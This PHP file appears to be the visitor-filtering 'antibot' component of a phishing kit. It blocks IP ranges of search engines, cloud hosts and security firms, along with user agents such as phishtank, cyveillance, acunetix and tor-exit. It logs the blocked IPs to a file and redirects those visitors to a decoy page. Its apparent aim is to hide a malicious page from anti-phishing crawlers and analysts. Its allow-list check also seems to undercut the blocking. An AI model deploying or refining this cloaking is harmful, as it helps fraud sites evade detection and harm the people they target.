<?php

$redirectUrl = $_SERVER['DOCUMENT_ROOT'] . '/site/index.html';

$blockedIPs = [
    "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", 
    "^74.125.*.*", "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", 
    "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", 
    "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", 
    "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", 
    "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", 
    "^131.212.*.*", "^46.116.*.*", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", 
    "^85.64.*.*", "^85.250.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", 
    "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", 
    "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", 
    "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", 
    "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", 
    "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", 
    "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", 
    "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", 
    "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*",
    "^173.245.48.*", "^103.21.244.*", "^103.22.200.*", "^103.31.4.*", "^141.101.64.*", 
    "^108.162.192.*", "^190.93.240.*", "^188.114.96.*", "^197.234.240.*", "^198.41.128.*", 
    "^162.158.0.*", "^104.16.0.*", "^172.64.0.*", "^131.0.72.*", "^168.1.5.*", 
    "^45.32.0.*", "^45.33.0.*", "^45.63.0.*", "^108.61.0.*", "^104.207.128.*",
    "^195.24.66.*", "^66.6.44.*", "^192.30.252.*", "^62.138.7.*", "^151.80.44.*", 
    "^54.36.148.*", "^195.154.122.*", "^172.104.141.*", "^209.58.140.*", "^77.247.110.*",
    "^46.166.190.*", "^185.53.90.*", "^198.50.252.*", "^163.172.70.*", "^192.34.85.*", 
    "^108.61.198.*", "^178.79.132.*", "^185.16.85.*", "^188.213.170.*", "^109.201.154.*",
    "^94.199.146.*", "^85.17.26.*", "^95.85.19.*", "^5.135.158.*", "^91.121.221.*", 
    "^37.139.8.*", "^188.40.2.*", "^185.33.85.*", "^78.46.211.*", "^88.198.93.*",
    "^46.4.120.*", "^192.241.228.*", "^209.141.35.*", "^212.83.147.*", "^139.59.1.*",
    "^176.31.45.*", "^88.80.186.*", "^80.240.134.*", "^217.12.211.*", "^79.125.5.*", 
    "^162.243.101.*", "^104.237.143.*", "^91.134.226.*", "^139.162.192.*", "^176.9.193.*", 
    "^173.255.226.*", "^144.217.161.*", "^212.47.248.*", "^80.85.84.*", "^178.62.158.*",
    "^207.154.198.*", "^139.59.99.*", "^212.47.226.*", "^185.117.215.*", "^158.69.204.*", 
    "^37.49.231.*", "^176.223.128.*", "^136.243.102.*", "^178.79.132.*", "^148.251.183.*",
    "^144.76.72.*", "^85.214.104.*", "^5.189.136.*", "^37.187.129.*", "^37.187.102.*", 
    "^178.62.29.*", "^178.62.244.*", "^37.139.19.*", "^95.142.173.*", "^95.142.162.*", 
    "^148.251.79.*", "^5.135.164.*", "^81.7.10.*", "^192.241.195.*", "^192.241.244.*", 
    "^89.234.157.*", "^185.31.208.*", "^85.214.85.*", "^5.135.191.*", "^5.135.147.*",
    "^198.245.50.*", "^178.62.20.*", "^185.49.148.*", "^185.31.160.*", "^185.92.220.*",
    "^185.92.221.*", "^178.62.20.*", "^178.62.205.*", "^188.165.15.*", "^62.75.168.*",
    "^176.10.99.*", "^46.101.57.*", "^85.25.98.*", "^85.25.103.*", "^178.32.53.*",
    "^178.32.50.*", "^46.165.245.*", "^46.165.222.*", "^5.135.54.*", "^136.243.102.*",
    "^85.25.145.*", "^138.201.91.*", "^85.214.215.*", "^46.101.52.*", "^193.70.45.*",
    "^178.79.166.*", "^185.21.217.*", "^188.138.88.*", "^178.63.99.*", "^62.75.167.*",
    "^62.75.207.*", "^84.200.91.*", "^178.254.13.*", "^178.254.10.*", "^178.254.11.*",
    "^192.71.248.*", "^192.71.249.*", "^91.224.160.*", "^91.229.77.*", "^85.25.28.*",
    "^188.213.170.*", "^188.213.170.*", "^188.213.170.*", "^109.201.154.*", "^109.201.154.*",
    "^94.199.146.*", "^94.199.146.*", "^94.199.146.*", "^85.17.26.*", "^85.17.26.*",
    "^95.85.19.*", "^95.85.19.*", "^5.135.158.*", "^5.135.158.*", "^91.121.221.*",
    "^37.139.8.*", "^37.139.8.*", "^188.40.2.*", "^185.33.85.*", "^78.46.211.*",
    "^88.198.93.*", "^46.4.120.*", "^192.241.228.*", "^209.141.35.*", "^212.83.147.*",
    "^139.59.1.*", "^176.31.45.*", "^88.80.186.*", "^80.240.134.*", "^217.12.211.*",
    "^79.125.5.*", "^162.243.101.*", "^104.237.143.*", "^91.134.226.*", "^139.162.192.*",
    "^176.9.193.*", "^173.255.226.*", "^144.217.161.*", "^212.47.248.*", "^80.85.84.*",
    "^178.62.158.*", "^207.154.198.*", "^139.59.99.*", "^212.47.226.*", "^185.117.215.*",
    "^158.69.204.*", "^37.49.231.*", "^176.223.128.*", "^136.243.102.*", "^178.79.132.*",
    "^148.251.183.*", "^144.76.72.*", "^85.214.104.*", "^5.189.136.*", "^37.187.129.*",
    "^37.187.102.*", "^178.62.29.*", "^178.62.244.*", "^37.139.19.*", "^95.142.173.*",
    "^95.142.162.*", "^148.251.79.*", "^5.135.164.*", "^81.7.10.*", "^192.241.195.*",
    "^192.241.244.*", "^89.234.157.*", "^185.31.208.*", "^85.214.85.*", "^5.135.191.*",
    "^5.135.147.*", "^198.245.50.*", "^178.62.20.*", "^185.49.148.*", "^185.31.160.*",
    "^185.92.220.*", "^185.92.221.*", "^178.62.20.*", "^178.62.205.*", "^188.165.15.*",
    "^62.75.168.*", "^176.10.99.*", "^46.101.57.*", "^85.25.98.*", "^85.25.103.*",
    "^178.32.53.*", "^178.32.50.*", "^46.165.245.*", "^46.165.222.*", "^5.135.54.*",
    "^136.243.102.*", "^85.25.145.*", "^138.201.91.*", "^85.214.215.*", "^46.101.52.*",
    "^193.70.45.*", "^178.79.166.*", "^185.21.217.*", "^188.138.88.*", "^178.63.99.*",
    "^62.75.167.*", "^62.75.207.*", "^84.200.91.*", "^178.254.13.*", "^178.254.10.*",
    "^178.254.11.*", "^192.71.248.*", "^192.71.249.*", "^91.224.160.*", "^91.229.77.*",
    "^85.25.28.*"
];

$blockedUserAgents = [
    'bot', 'above', 'google', 'googlebot', 'softlayer', 'amazonaws', 'cyveillance', 'compatible', 
    'facebook', 'phishtank', 'dreamhost', 'netpilot', 'calyxinstitute', 'tor-exit', 
    'apache-httpclient', 'lssrocketcrawler', 'Trident', 'X11', 'crawler', 'urlredirectresolver', 
    'jetbrains', 'spam', 'acunetix', 'netsparker', '007ac9', '008', '192.comagent', '200pleasebot', 
    '360spider', '4seohuntbot', '50.nu', 'a6-indexer', 'admantx', 'amznkassocbot', 'aboundexbot', 
    'aboutusbot', 'abrave spider', 'accelobot', 'acoonbot', 'addthis.com', 'adsbot-google', 'ahrefsbot', 
    'alexabot', 'amagit.com', 'analytics', 'antbot', 'apercite', 'aportworm', 'EBAY', 'CL0NA', 
    'jabber', 'ebay', 'arabot', 'hotmail!', 'msn!', 'outlook!', 'outlook', 'msn', 'hotmail',
    'baidu', 'yandex', 'bingbot', 'slurp', 'duckduckgo', 'qwant', 'sogou', 'archive.org_bot', 
    'petalbot', 'seznambot', 'applebot', 'phantomjs', 'headless', 'python-requests', 'scrapy', 
    'curl', 'wget', 'httpclient', 'libwww-perl', 'Go-http-client', 'Java', 'MauiBot', 'MJ12bot', 
    'Seekport Crawler', 'Site24x7', 'VelenPublicWebCrawler', 'Exabot', 'Ezooms', 'DotBot', 
    'MojeekBot', 'BLEXBot', 'Embedly', 'LinkdexBot', 'PaperLiBot', 'SiteSucker',
    'panscient.com', 'semrushbot', 'rogerbot', 'piplbot', 'proximic', 'istellabot', 'wbsearchbot', 
    'tweetmemebot', 'bitlybot', 'tineye', 'urlredirectresolver', 'recurpost', 'linkfluence', 
    'ltx71', 'truwoGPS', 'trendictionbot', 'smile', 'simplepie', 'slackbot', 'signalr', 
    'serendeputy', 'seekport', 'screaming', 'screenerbot', 'scoutjet', 'scoop', 'sogou', 
    'snoopy', 'spaziodati', 'spbot', 'speedy', 'sprinklr', 'ssearch_bot', 'startmebot', 
    'summify', 'teoma', 'truwo', 'twinword', 'typhoeus', 'ubermetrics', 'uksearch', 
    'unisterbot', 'urlappend', 'whatsapp', 'whatsmyip', 'wii', 'wocbot', 'wordpres', 
    'xenu', 'yahoo', 'yahoo! slurp', 'yahoo! slurp china', 'yahooseeker', 'yandex', 
    'yodao', 'youdao', 'zgrab', 'zookabot', 'zoominfo', 'zend', 'zune', 'zealbot', 
    'yisouspider', 'yacybot', 'xovibot', 'xovibot', 'xmlrpc', 'xenu', 'wpif', 'windows 95', 
    'winhttp', 'w3c', 'validator', 'wget', 'webinator', 'webbrawler', 'webcollage', 
    'webalta', 'voyager', 'voltron', 'voilabot', 'vocusbot', 'virtual mechanics', 
    'viperbot', 'vinebot', 'vigilbot', 'vgener', 'verticrawl', 'urlsearch', 'urlfilter', 
    'url checker', 'ultrabrowser', 'uipbot', 'uiverso', 'twingly', 'twiceler', 'twengabot', 
    'twingly', 'twisted', 'twisted pagegetter', 'twisted web', 'turnitinbot', 'truwo', 
    'trident', 'trendiction', 'trendspottr', 'translate', 'translator', 'trustworld', 
    'truwo', 'trustwave', 'trendictionbot', 'trendiction', 'translate', 'translator'
];

$allowedUserAgents = [
    'Mozilla/5.0', // Navigateur courant sur différentes plateformes
    'AppleWebKit/', // Moteur de rendu pour Safari, Chrome, etc.
    'Chrome/', // Navigateur Chrome
    'Safari/', // Navigateur Safari
    'Firefox/', // Navigateur Firefox
    'Opera/', // Navigateur Opera
    'Edge/', // Navigateur Edge
    'SamsungBrowser/', // Navigateur Samsung
    'Mobile Safari/', // Navigateur mobile Safari
    'Android', // Appareils Android
    'iPhone', // iPhone
    'iPad', // iPad
    'Windows NT', // Windows
    'Macintosh', // MacOS
    'Linux', // Linux
    'CriOS/', // Chrome sur iOS
    'FxiOS/', // Firefox sur iOS
    'EdgiOS/', // Edge sur iOS
    'Silk/', // Navigateur Silk d'Amazon
    'UCWEB/', // UC Browser
    'OPR/', // Opera Mini
    'YandexBrowser/', // Yandex Browser
    'YaBrowser/', // Yandex Browser (alternative)
    'MSIE', // Internet Explorer
    'Trident/', // Internet Explorer
    'Vivaldi/', // Vivaldi Browser
    'DuckDuckGo/', // DuckDuckGo Privacy Browser
    'PaleMoon/', // Pale Moon Browser
    'Waterfox/', // Waterfox Browser
    'Brave/', // Brave Browser
    'Maxthon/', // Maxthon Browser
    'Epiphany/', // Epiphany (Gnome) Browser
    'Seamonkey/', // SeaMonkey Browser
    'Midori/', // Midori Browser
    'Comodo_Dragon/', // Comodo Dragon Browser
    'Iron/', // SRWare Iron Browser
    'QupZilla/', // QupZilla Browser
    'Otter/', // Otter Browser
    'Konqueror/', // Konqueror Browser
    'Galeon/', // Galeon Browser
    'NetSurf/', // NetSurf Browser
    'Dillo/', // Dillo Browser
    'Netscape/', // Netscape Navigator
    'Lynx/', // Lynx Text Browser
    'w3m/', // w3m Text Browser
    'Links/', // Links Text Browser
    'ELinks/', // ELinks Text Browser
    'AmigaVoyager/', // Amiga Voyager Browser
    'IBrowse/', // IBrowse Browser
    'AWeb/', // AWeb Browser
    'Amaya/', // Amaya Browser
    'Arora/', // Arora Browser
    'Basilisk/', // Basilisk Browser
    'BlackBerry/', // BlackBerry Browser
    'Clarity/', // Clarity Browser
    'Dooble/', // Dooble Browser
    'EdgeA/', // Edge Android Browser
    'Flock/', // Flock Browser
    'GoBrowser/', // Go Browser
    'IceCat/', // GNU IceCat Browser
    'Iceweasel/', // Iceweasel Browser
    'iCab/', // iCab Browser
    'K-Meleon/', // K-Meleon Browser
    'Minimo/', // Minimo Browser
    'OmniWeb/', // OmniWeb Browser
    'Phoenix/', // Phoenix Browser
    'Roccat/', // Roccat Browser
    'Sleipnir/', // Sleipnir Browser
    'Swyft/', // Swyft Browser
    'Voyager/', // Voyager Browser
    'Wyzo/', // Wyzo Browser
    'AndroidWebView/', // Android WebView
    'PlayStation', // PlayStation Browser
    'NintendoBrowser', // Nintendo Browser
    'Xbox', // Xbox Browser
    'Valve Steam', // Steam In-Game Browser
    'S60', // Nokia S60 Browser
    'NokiaBrowser', // Nokia Browser
    'TizenBrowser/', // Tizen Browser
    'SailfishBrowser/', // Sailfish Browser
    'webOS', // webOS Browser
    'NetFront/', // NetFront Browser
    'Avant Browser', // Avant Browser
    'Lunascape', // Lunascape Browser
    'SlimBrowser', // SlimBrowser
    'Maxthon', // Maxthon Browser
    'Raven', // Raven Browser
    'Coc Coc', // Coc Coc Browser
    'KMeleon', // K-Meleon Browser
    'IceDragon', // IceDragon Browser
    'Baidu', // Baidu Browser
];

function redirectAndExit($url) {
    header('Location: ' . $url, true, 302);
    exit;
}

function isBlockedIP($ip, $blockedIPs) {
    foreach ($blockedIPs as $blockedIP) {
        if (preg_match('/' . $blockedIP . '/', $ip)) return true;
    }
    return false;
}

function isBlockedUserAgent($userAgent, $blockedUserAgents) {
    foreach ($blockedUserAgents as $blockedUserAgent) {
        if (stripos($userAgent, $blockedUserAgent) !== false) return true;
    }
    return false;
}

function isAllowedUserAgent($userAgent, $allowedUserAgents) {
    foreach ($allowedUserAgents as $allowedUserAgent) {
        if (stripos($userAgent, $allowedUserAgent) !== false) return true;
    }
    return false;
}

$redirectUrl = '/site/index.html';
$blFile      = __DIR__ . '/../bl.txt';
$isPost      = ($_SERVER['REQUEST_METHOD'] === 'POST');

$userIP    = $_SERVER['REMOTE_ADDR'] ?? '';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

if (!isset($_SESSION['rdns'])) {
    $_SESSION['rdns'] = $userIP !== '' ? (@gethostbyaddr($userIP) ?: '') : '';
}
$hostname = $_SESSION['rdns'];

$blocked = isBlockedIP($userIP, $blockedIPs)
        || isBlockedUserAgent($userAgent, $blockedUserAgents)
        || ($hostname !== '' && isBlockedUserAgent($hostname, $blockedUserAgents));

if ($blocked && !isAllowedUserAgent($userAgent, $allowedUserAgents)) {
    if ($userIP !== '') {
        @file_put_contents($blFile, $userIP . PHP_EOL, FILE_APPEND | LOCK_EX);
    }
    if ($isPost) { return; }
    redirectAndExit($redirectUrl);
}
?>